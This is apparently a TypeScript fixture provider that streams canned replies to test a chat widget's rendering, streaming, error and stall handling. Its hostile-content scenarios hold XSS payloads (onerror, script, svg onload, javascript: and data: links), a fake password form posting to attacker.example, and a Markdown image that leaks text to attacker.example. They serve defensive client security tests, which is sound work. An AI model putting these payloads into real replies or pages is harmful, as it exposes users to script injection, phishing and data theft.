// Canned replies for tests and local development. No AI service is called.
//
// By default the reply echoes the visitor's message. A message of the form `/fixture <name>`
// selects a scenario instead; `/fixture help` lists them. Scenarios cover normal rendering,
// protocol edge cases, failures, and hostile content (README §7.1) for client security tests.

import { serverMessage } from './i18n.ts'
import type { ChatProvider, ProviderEvent, ProviderRequest } from './provider.ts'
import { ProviderError } from './provider.ts'
import { xssProbe } from './sites.ts'

export interface FixtureProviderOptions {
  /** Delay between streamed chunks. 0 in tests; a small value makes streaming visible by eye. */
  chunkDelayMs?: number
}

interface Scenario {
  description: string
  run: (context: ScenarioContext) => AsyncGenerator<ProviderEvent>
}

interface ScenarioContext {
  request: ProviderRequest
  /** Visitor text after `/fixture <name>`, or the whole message for the default echo. */
  argument: string
  sleep: (ms: number) => Promise<void>
  chunkDelayMs: number
}

const mark = xssProbe

/** How long the stall fixtures wait (until the visitor disconnects, in practice). */
const STALL_MS = 10 * 60_000

/** Hostile Markdown/HTML payloads. Each tries to set window.__ciXss to its own label. */
export const HOSTILE_CONTENT = {
  'xss-tooltip': [
    'A citation whose label is HTML. Hovering it must not run script:',
    `[<img src=x onerror="${mark('tooltip')}">](/site/abc/file/def)`,
  ].join('\n\n'),
  'xss-links': [
    `[markdown javascript link](javascript:${mark('md-link')})`,
    `[citation with hostile original URL](https://example.com/){data-original-url="javascript:${mark('original-url')}"}`,
    `<a href="javascript:${mark('raw-link')}">raw HTML javascript link</a>`,
    `<WebSource data-url="javascript:${mark('websource')}">web source</WebSource>`,
    `[data URL](data:text/html,<script>${mark('data-url')}</script>)`,
  ].join('\n\n'),
  'xss-html': [
    `<img src=x onerror="${mark('img-onerror')}">`,
    `<script>${mark('script')}</script>`,
    `<svg onload="${mark('svg-onload')}"></svg>`,
    `<iframe srcdoc="<script>parent.${mark('iframe')}</script>"></iframe>`,
    '<form action="https://attacker.example/collect"><input type="password" name="pw" placeholder="Re-enter your password"><button>Continue</button></form>',
    '<div style="position:fixed;inset:0;background:#c00;z-index:99999">overlay</div>',
    '<a href="https://attacker.example/" target="_blank">link without rel=noopener</a>',
  ].join('\n\n'),
  'exfil-image': [
    'Markdown images can leak conversation data to any server when rendered:',
    '![status](https://attacker.example/pixel.png?leak=visitor-question-text)',
  ].join('\n\n'),
} as const

const MARKDOWN_SAMPLE = `# Heading

Some **bold**, *italic*, \`inline code\` and a [normal link](https://example.com/).

- First item
- Second item
  1. Nested ordered

> A quotation.

\`\`\`js
function hello(name) {
  return \`Hello \${name}\`
}
\`\`\`

| Column | Value |
| --- | --- |
| a | 1 |`

const CITATION_SAMPLE = [
  'Answer with a source citation [example.com](https://example.com/docs){data-original-url="https://example.com/docs"}.',
  'A web search result <WebSource data-url="https://example.org/article">Example article</WebSource>.',
  'An internal retrieval marker that must not be shown:<chunkId>chunk-123</chunkId> (hidden above).',
  'A file citation [Pricing sheet](/site/site-demo/file/file-456){data-original-url="https://example.com/pricing"}.',
].join('\n\n')

function words(text: string): string[] {
  return text.match(/\S+\s*/g) ?? [text]
}

async function* streamText(context: ScenarioContext, text: string): AsyncGenerator<ProviderEvent> {
  for (const chunk of words(text)) {
    if (context.request.signal.aborted) return
    yield { type: 'content', content: chunk }
    if (context.chunkDelayMs > 0) await context.sleep(context.chunkDelayMs)
  }
}

const SCENARIOS: Record<string, Scenario> = {
  help: {
    description: 'List the available scenarios.',
    async *run(context) {
      const lines = Object.entries(SCENARIOS).map(
        ([name, scenario]) => `- \`/fixture ${name}\` — ${scenario.description}`,
      )
      yield* streamText(
        context,
        [
          'Fixture scenarios (developer tool; descriptions and sample replies are in English,',
          'while the echo, greeting and error messages follow the widget language):',
          '',
          ...lines,
          '',
          'Any other message is echoed back.',
        ].join('\n'),
      )
    },
  },
  echo: {
    description: 'Echo the text after the command (also the default for any message).',
    async *run(context) {
      yield* streamText(
        context,
        serverMessage('echo', context.request.language, { text: context.argument }),
      )
    },
  },
  markdown: {
    description: 'Headings, lists, code, quote and table.',
    async *run(context) {
      yield* streamText(context, MARKDOWN_SAMPLE)
    },
  },
  citations: {
    description: 'Citation links, a web source, a chunk marker and a file citation.',
    async *run(context) {
      yield* streamText(context, CITATION_SAMPLE)
    },
  },
  long: {
    description: 'A long reply (about 400 chunks).',
    async *run(context) {
      const paragraph =
        'This is a long streamed reply used to test scrolling and rendering performance. '
      yield* streamText(context, paragraph.repeat(30).trim())
    },
  },
  slow: {
    description: 'Ten chunks, 300 ms apart (for testing cancel and new chat during a reply).',
    async *run(context) {
      for (let index = 1; index <= 10; index += 1) {
        if (context.request.signal.aborted) return
        yield { type: 'content', content: `Chunk ${index}. ` }
        await context.sleep(300)
      }
    },
  },
  'thinking-tools': {
    description: 'Thinking and tool call events before the answer.',
    async *run(context) {
      yield { type: 'thinking', thinking: 'Looking for relevant pages...' }
      yield {
        type: 'toolCall',
        id: 'call_fixture_1',
        name: 'retrieve_context',
        arguments: JSON.stringify({ query: context.argument || 'example' }),
      }
      yield { type: 'toolCallComplete' }
      yield* streamText(context, 'Here is the answer after using a tool.')
    },
  },
  'final-rewrite': {
    description: 'Streamed text differs from the final message, which must replace it.',
    async *run(context) {
      yield* streamText(context, 'Draft text that will be replaced.')
      yield { type: 'final', content: 'Final text from message_finalized.' }
    },
  },
  keepalive: {
    description: 'SSE comment lines between events (clients must ignore them).',
    async *run(context) {
      for (const chunk of words('Reply with keep-alive comments in between.')) {
        if (context.request.signal.aborted) return
        yield { type: 'test:comment', comment: 'keep-alive' }
        yield { type: 'content', content: chunk }
      }
    },
  },
  'split-frames': {
    description: 'Each event arrives in several network chunks, split mid-character.',
    async *run(context) {
      yield { type: 'test:split-frames' }
      yield* streamText(context, 'Split frames with multi-byte text: café, 日本語, emoji 🎉 done.')
    },
  },
  ...Object.fromEntries(
    (['compact', 'multiline', 'crlf', 'fields', 'no-blank-lines'] as const).map(format => [
      `sse-${format}`,
      {
        description: `Events framed as "${format}" Server-Sent Events (valid, but not the usual form).`,
        async *run(context: ScenarioContext) {
          yield { type: 'test:sse-format', format } satisfies ProviderEvent
          yield* streamText(context, `Framed as ${format}: line one\nline two.`)
        },
      } satisfies Scenario,
    ]),
  ),
  'error-before-stream': {
    description: 'Upstream failure before any output: HTTP 502 with an error body.',
    async *run(context) {
      throw new ProviderError(502, serverMessage('unavailable', context.request.language))
    },
  },
  'rate-limited': {
    description: 'HTTP 429 with Retry-After.',
    async *run(context) {
      throw new ProviderError(429, serverMessage('rateLimited', context.request.language), 30)
    },
  },
  'error-mid-stream': {
    description: 'Some text, then a stream error event.',
    async *run(context) {
      yield* streamText(context, 'Partial answer before failure...')
      throw new ProviderError(502, serverMessage('stoppedUnexpectedly', context.request.language))
    },
  },
  'end-without-done': {
    description: 'Some text, then the stream ends cleanly without done or error.',
    async *run(context) {
      yield* streamText(context, 'Partial answer, then a clean end of stream.')
      yield { type: 'test:end' }
    },
  },
  stall: {
    description: 'Accepts the message, then sends nothing until the visitor disconnects.',
    async *run(context) {
      await context.sleep(STALL_MS)
    },
  },
  'stall-mid-stream': {
    description: 'Some text, then silence (no keep-alives) until the visitor disconnects.',
    async *run(context) {
      yield* streamText(context, 'Partial answer, then silence...')
      await context.sleep(STALL_MS)
    },
  },
  whoami: {
    description: 'Replies with the user ID the widget sent (x-clearideas-public-chat-user-id).',
    async *run(context) {
      const userId = context.request.userId
      yield* streamText(
        context,
        userId ? `User ID: \`${userId}\` (unverified)` : 'No user ID was sent.',
      )
    },
  },
  disconnect: {
    description: 'Some text, then the connection drops mid-stream (network error).',
    async *run(context) {
      yield* streamText(context, 'Partial answer before the connection drops.')
      yield { type: 'test:disconnect' }
    },
  },
  ...Object.fromEntries(
    Object.entries(HOSTILE_CONTENT).map(([name, content]) => [
      name,
      {
        description: `Hostile content (${name}); the widget must render it inertly.`,
        async *run(context: ScenarioContext) {
          yield* streamText(context, content)
        },
      } satisfies Scenario,
    ]),
  ),
  'xss-all': {
    description: 'All hostile content scenarios in one reply.',
    async *run(context) {
      yield* streamText(context, Object.values(HOSTILE_CONTENT).join('\n\n'))
    },
  },
}

export const FIXTURE_SCENARIOS: readonly string[] = Object.keys(SCENARIOS)

/** Parses `/fixture <name> [argument]`. Returns null for ordinary messages. */
export function parseFixtureCommand(text: string): { name: string; argument: string } | null {
  const match = /^\/fixture(?:\s+(\S+))?(?:\s+([\s\S]*))?$/.exec(text.trim())
  if (!match) return null
  return { name: match[1] ?? 'help', argument: match[2]?.trim() ?? '' }
}

export class FixtureProvider implements ChatProvider {
  private chunkDelayMs: number

  constructor(options: FixtureProviderOptions = {}) {
    this.chunkDelayMs = options.chunkDelayMs ?? 0
  }

  reply(request: ProviderRequest): AsyncIterable<ProviderEvent> {
    const last = request.history[request.history.length - 1]
    const text = last?.role === 'user' ? last.content : ''
    const command = parseFixtureCommand(text)

    const scenario = command ? (SCENARIOS[command.name] ?? unknownScenario(command.name)) : null
    const context: ScenarioContext = {
      request,
      argument: command ? command.argument : text,
      sleep: ms => sleep(ms, request.signal),
      chunkDelayMs: this.chunkDelayMs,
    }
    return (scenario ?? SCENARIOS.echo).run(context)
  }
}

function unknownScenario(name: string): Scenario {
  return {
    description: 'Unknown scenario',
    async *run(context) {
      yield* streamText(
        context,
        `Unknown fixture "${name}". Available: ${FIXTURE_SCENARIOS.join(', ')}.`,
      )
    },
  }
}

function sleep(ms: number, signal: AbortSignal): Promise<void> {
  return new Promise(resolve => {
    if (signal.aborted) return resolve()
    const timer = setTimeout(done, ms)
    signal.addEventListener('abort', done, { once: true })
    function done() {
      clearTimeout(timer)
      signal.removeEventListener('abort', done)
      resolve()
    }
  })
}
